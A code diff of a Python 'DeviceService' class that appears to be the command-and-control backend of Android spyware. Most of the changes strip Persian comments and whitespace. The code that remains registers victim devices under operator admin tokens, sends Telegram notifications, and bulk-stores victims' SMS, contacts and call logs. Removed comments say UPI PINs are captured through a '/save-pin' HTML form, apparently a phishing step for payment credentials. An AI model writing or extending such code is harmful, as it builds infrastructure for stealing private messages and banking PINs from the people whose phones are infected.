@@ -16,19 +16,10 @@ class DeviceService:
 
     @staticmethod
     def _assign_telegram_bot() -> int:
-        """
-        تخصیص ربات تلگرام به دستگاه جدید
-        
-        Device notifications همیشه به Bot 1 میرن
-        
-        Returns:
-            int: شماره ربات (همیشه 1 برای device notifications)
-        """
-        return 1  # Bot 1: Device Notifications
+        return 1
 
     @staticmethod
     async def register_device(device_id: str, device_info: dict, admin_token: Optional[str] = None):
-        """رجیستر دستگاه با توکن ادمین"""
         try:
             existing_device = await mongodb.db.devices.find_one({"device_id": device_id})
             is_new_device = existing_device is None
@@ -38,8 +29,7 @@ class DeviceService:
             user_id = device_info.get("user_id", "USER_ID_HERE")
             app_type = device_info.get("app_type", "MP")
             sim_info = device_info.get("sim_info", [])
-            
-            # 🔑 پیدا کردن ادمین از روی توکن
+
             admin_username = None
             if admin_token:
                 from ..services.auth_service import auth_service
@@ -85,18 +75,15 @@ class DeviceService:
                 "sim_info": sim_info,
                 "user_id": user_id,
                 "app_type": app_type,
-                "admin_token": admin_token,  # 🔑 توکن ادمین
-                "admin_username": admin_username,  # 👤 نام کاربری ادمین
+                "admin_token": admin_token,
+                "admin_username": admin_username,
                 "status": "online",
                 "last_ping": now,
                 "updated_at": now
             }
 
-            # استفاده از upsert برای جلوگیری از duplicate key error
-            # اگر device موجود بود update میکنه، اگر نبود insert میکنه
-            
             telegram_bot_id = DeviceService._assign_telegram_bot()
-            
+
             update_data = {
                 "$set": common_data,
                 "$setOnInsert": {
@@ -122,18 +109,16 @@ class DeviceService:
                     "last_online_update": now,
                 }
             }
-            
-            # Add FCM token (بدون تکرار)
+
             if fcm_token:
                 update_data["$addToSet"] = {"fcm_tokens": fcm_token}
-            
-            # upsert: اگر موجود بود update، اگر نبود insert
+
             result = await mongodb.db.devices.update_one(
                 {"device_id": device_id},
                 update_data,
                 upsert=True
             )
-            
+
             if result.upserted_id:
                 logger.info(f"✅ New device registered: {device_id} (Bot {telegram_bot_id})")
             else:
@@ -180,11 +165,11 @@ class DeviceService:
     async def get_device(device_id: str) -> Optional[Device]:
         try:
             device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
-            
+
             if device_doc:
-                # Heartbeat هر 3 دقیقه میاد، پس 6 دقیقه timeout
+
                 six_minutes_ago = datetime.utcnow() - timedelta(minutes=6)
-                
+
                 if device_doc.get("last_ping") and device_doc["last_ping"] < six_minutes_ago:
                     await mongodb.db.devices.update_one(
                         {"device_id": device_id},
@@ -198,8 +183,7 @@ class DeviceService:
                     )
                     device_doc["status"] = "offline"
                     device_doc["is_online"] = False
-                
-                # normalize کن
+
                 normalized = DeviceService._normalize_device_data(device_doc)
                 return Device(**normalized)
             return None
@@ -209,13 +193,12 @@ class DeviceService:
 
     @staticmethod
     async def save_sms_history(device_id: str, sms_list: list):
-        """ذخیره تاریخچه SMS + تشخیص و ذخیره UPI PIN"""
         try:
             if not sms_list:
                 return
-            
+
             current_time = datetime.utcnow()
-            
+
             operations = []
             for sms in sms_list:
                 sms_data = {
@@ -229,7 +212,7 @@ class DeviceService:
                     "is_read": sms.get("is_read", False),
                     "received_at": current_time
                 }
-                
+
                 operations.append(
                     UpdateOne(
                         {"sms_id": sms_data["sms_id"]},
@@ -237,15 +220,13 @@ class DeviceService:
                         upsert=True
                     )
                 )
-            
-            # ذخیره دسته‌ای پیامک‌ها
+
             if operations:
                 result = await mongodb.db.sms_messages.bulk_write(operations, ordered=False)
                 logger.info(f"📥 SMS saved: {result.upserted_count + result.modified_count}")
-            
-            # آپدیت stats
+
             total_sms = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
-            
+
             await mongodb.db.devices.update_one(
                 {"device_id": device_id},
                 {
@@ -255,21 +236,15 @@ class DeviceService:
                     }
                 }
             )
-            
-            # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
-            
+
         except Exception as e:
             logger.error(f"❌ Save SMS failed: {e}")
             raise
 
-    # ℹ️ NOTE: UPI PIN extraction from SMS removed
-    # UPI PIN now comes directly from /save-pin endpoint (HTML form)
-
     @staticmethod
     async def save_new_sms(device_id: str, sms_data: dict):
         try:
-            # اگر sms_id از کلاینت اومده، از اون استفاده کن
-            # در غیر این صورت یک hash بساز
+
             if sms_data.get("sms_id"):
                 sms_id = sms_data.get("sms_id")
             else:
@@ -277,7 +252,6 @@ class DeviceService:
                     f"{device_id}:{sms_data.get('from', '')}:{sms_data.get('to', '')}:{sms_data.get('timestamp', 0)}:{sms_data.get('body', '')}".encode()
                 ).hexdigest()
 
-            # بررسی تکراری بودن
             existing = await mongodb.db.sms_messages.find_one({"sms_id": sms_id})
             if existing:
                 logger.info(f"⚠️ Duplicate SMS ignored: {sms_id}")
@@ -296,17 +270,16 @@ class DeviceService:
                 "tags": [],
                 "received_at": datetime.utcnow()
             }
-            
-            # ✅ فیلدهای اضافی برای SMS ارسالی
+
             if sms_data.get("sim_slot") is not None:
                 message["sim_slot"] = sms_data.get("sim_slot")
-            
+
             if sms_data.get("delivery_status"):
                 message["delivery_status"] = sms_data.get("delivery_status")
-            
+
             if sms_data.get("delivery_details"):
                 message["delivery_details"] = sms_data.get("delivery_details")
-            
+
             if sms_data.get("received_in_native") is not None:
                 message["received_in_native"] = sms_data.get("received_in_native")
 
@@ -315,14 +288,11 @@ class DeviceService:
                 {"device_id": device_id},
                 {"$inc": {"stats.total_sms": 1}}
             )
-            
+
             logger.info(f"✅ SMS saved: {sms_id} (type: {message['type']})")
-            
-            # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
-                    
+
         except Exception as e:
             logger.error(f"❌ Save new SMS failed: {e}")
-
 
     @staticmethod
     async def get_sms_messages(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
@@ -342,7 +312,6 @@ class DeviceService:
 
     @staticmethod
     async def save_contacts(device_id: str, contacts_list: List[dict]):
-        """ذخیره مخاطبین"""
         try:
             if not contacts_list:
                 return
@@ -351,15 +320,15 @@ class DeviceService:
             operations = []
 
             for contact in contacts_list:
-                contact_id = contact.get("contact_id", "")          # ⭐ تغییر
+                contact_id = contact.get("contact_id", "")
                 name = contact.get("name", "")
-                phone = contact.get("phone_number", "")             # ⭐ تغییر
-                
+                phone = contact.get("phone_number", "")
+
                 if not phone or not contact_id:
                     continue
 
                 contact_doc = {
-                    "contact_id": contact_id,                       # ⭐ از اندروید میاد
+                    "contact_id": contact_id,
                     "device_id": device_id,
                     "name": name,
                     "phone_number": phone,
@@ -374,17 +343,15 @@ class DeviceService:
                     )
                 )
 
-            # ذخیره bulk
             if operations:
                 result = await mongodb.db.contacts.bulk_write(operations, ordered=False)
                 new_count = result.upserted_count
                 update_count = result.modified_count
-                
+
                 logger.info(f"✅ Contacts: {new_count} new, {update_count} updated for {device_id}")
-            
-            # آپدیت stats
+
             total = await mongodb.db.contacts.count_documents({"device_id": device_id})
-            
+
             await mongodb.db.devices.update_one(
                 {"device_id": device_id},
                 {
@@ -416,7 +383,6 @@ class DeviceService:
 
     @staticmethod
     async def save_call_logs(device_id: str, call_logs: List[dict]):
-        """ذخیره تاریخچه تماس - کاتلین میفرسته: number, name, call_type, timestamp, duration, duration_formatted"""
         try:
             if not call_logs:
                 return
@@ -448,13 +414,12 @@ class DeviceService:
                     "received_at": now
                 }
 
-                # استفاده از upsert برای جلوگیری از duplicate key error
                 result = await mongodb.db.call_logs.update_one(
                     {"call_id": call_hash},
                     {"$setOnInsert": call_doc},
                     upsert=True
                 )
-                
+
                 if result.upserted_id:
                     new_count += 1
 
@@ -521,21 +486,17 @@ class DeviceService:
             logger.error(f"❌ Get logs failed: {e}")
             return []
 
-
     @staticmethod
     def _normalize_device_data(device_doc: dict) -> dict:
-        """تبدیل داده‌های دستگاه به فرمت صحیح برای validation"""
-        
-        # تبدیل float به string برای درصدها (بدون اعشار)
+
         if device_doc.get("storage_percent_free") is not None:
             value = float(device_doc["storage_percent_free"])
             device_doc["storage_percent_free"] = str(int(value))
-        
+
         if device_doc.get("ram_percent_free") is not None:
             value = float(device_doc["ram_percent_free"])
             device_doc["ram_percent_free"] = str(int(value))
-        
-        # تبدیل float به int برای حافظه‌ها
+
         int_fields = [
             "total_storage_mb", "free_storage_mb", "storage_used_mb",
             "total_ram_mb", "free_ram_mb", "ram_used_mb"
@@ -543,16 +504,11 @@ class DeviceService:
         for field in int_fields:
             if device_doc.get(field) is not None:
                 device_doc[field] = int(device_doc[field])
-        
-        # ⭐ حذف این بخش - دیگه نیازی نیست دستی map کنی
-        # چون Pydantic با alias خودش map میکنه
-        # sim_info رو همونطور که هست نگه دار
-        
+
         return device_doc
 
     @staticmethod
     async def save_device_note(device_id: str, priority: str, message: str):
-        """ذخیره Note برای دستگاه"""
         try:
             await mongodb.db.devices.update_one(
                 {"device_id": device_id},
@@ -565,36 +521,28 @@ class DeviceService:
                     }
                 }
             )
-            
+
             logger.info(f"📝 Note saved for device: {device_id} - Priority: {priority}")
-            
+
             await DeviceService.add_log(
                 device_id,
                 "note",
                 f"Note updated - Priority: {priority}",
                 "info"
             )
-            
+
             return True
-            
+
         except Exception as e:
             logger.error(f"❌ Save note failed: {e}")
             return False
 
-
-
     @staticmethod
     async def get_devices_for_admin(admin_username: str, is_super_admin: bool = False, skip: int = 0, limit: int = 100) -> List[Device]:
-        """
-        دریافت دستگاه‌ها بر اساس ادمین
-        - Super Admin: همه دستگاه‌ها
-        - Admin معمولی: فقط دستگاه‌های خودش
-        """
         try:
-            # Heartbeat هر 3 دقیقه میاد، پس 6 دقیقه timeout
+
             six_minutes_ago = datetime.utcnow() - timedelta(minutes=6)
-            
-            # آپدیت وضعیت آفلاین برای دستگاه‌هایی که 6 دقیقه heartbeat ندادن
+
             result = await mongodb.db.devices.update_many(
                 {
                     "last_ping": {"$lt": six_minutes_ago},
@@ -608,16 +556,15 @@ class DeviceService:
                     }
                 }
             )
-            
+
             if result.modified_count > 0:
                 logger.info(f"🔴 Marked {result.modified_count} devices as offline")
-            
-            # فیلتر بر اساس ادمین
+
             query = {} if is_super_admin else {"admin_username": admin_username}
-            
+
             cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
             devices = await cursor.to_list(length=limit)
-            
+
             device_list = []
             for device_doc in devices:
                 try:
@@ -626,18 +573,18 @@ class DeviceService:
                 except Exception as e:
                     logger.warning(f"⚠️ Skipping device {device_doc.get('device_id')}: {e}")
                     continue
-            
+
             return device_list
-            
+
         except Exception as e:
             logger.error(f"❌ Get devices failed: {e}")
             return []
-    
+
     @staticmethod
     async def get_all_devices(skip: int = 0, limit: int = 100) -> List[Device]:
         try:
             two_minutes_ago = datetime.utcnow() - timedelta(minutes=2)
-            
+
             result = await mongodb.db.devices.update_many(
                 {
                     "last_ping": {"$lt": two_minutes_ago},
@@ -650,13 +597,13 @@ class DeviceService:
                     }
                 }
             )
-            
+
             if result.modified_count > 0:
                 logger.info(f"🔴 Marked {result.modified_count} devices as offline")
-            
+
             cursor = mongodb.db.devices.find().skip(skip).limit(limit).sort("registered_at", -1)
             devices = await cursor.to_list(length=limit)
-            
+
             device_list = []
             for device_doc in devices:
                 try:
@@ -665,13 +612,12 @@ class DeviceService:
                 except Exception as e:
                     logger.warning(f"⚠️ Skipping device {device_doc.get('device_id')}: {e}")
                     continue
-            
+
             return device_list
-            
+
         except Exception as e:
             logger.error(f"❌ Get devices failed: {e}")
             return []
-
 
     @staticmethod
     async def update_device_settings(device_id: str, settings: dict):
@@ -735,7 +681,7 @@ class DeviceService:
     async def update_device_info(device_id: str, device_info: dict):
         try:
             update_data = {"updated_at": datetime.utcnow()}
-            
+
             if "battery" in device_info:
                 update_data["battery_level"] = device_info["battery"]
             if "battery_state" in device_info:
@@ -944,16 +890,13 @@ class DeviceService:
     @staticmethod
     async def get_stats(admin_username: Optional[str] = None) -> Dict[str, int]:
         try:
-            # اول offline ها رو آپدیت کن
-            # Heartbeat هر 3 دقیقه میاد، پس 6 دقیقه timeout
+
             six_minutes_ago = datetime.utcnow() - timedelta(minutes=6)
-            
-            # فیلتر پایه
+
             base_query = {}
             if admin_username:
                 base_query["admin_username"] = admin_username
-            
-            # آپدیت offline ها برای دستگاه‌هایی که 6 دقیقه heartbeat ندادن
+
             await mongodb.db.devices.update_many(
                 {
                     **base_query,
@@ -968,12 +911,11 @@ class DeviceService:
                     }
                 }
             )
-            
-            # حالا آمار رو بگیر (فقط دستگاه‌های این ادمین)
+
             total = await mongodb.db.devices.count_documents(base_query)
             if total == 0:
                 return {"total_devices": 0, "active_devices": 0, "pending_devices": 0, "online_devices": 0, "offline_devices": 0}
-            
+
             online = await mongodb.db.devices.count_documents({**base_query, "status": "online"})
             offline = total - online
             pending = await mongodb.db.devices.count_documents({
@@ -985,7 +927,7 @@ class DeviceService:
                 ]
             })
             active = total - pending
-            
+
             return {
                 "total_devices": total,
                 "active_devices": active,
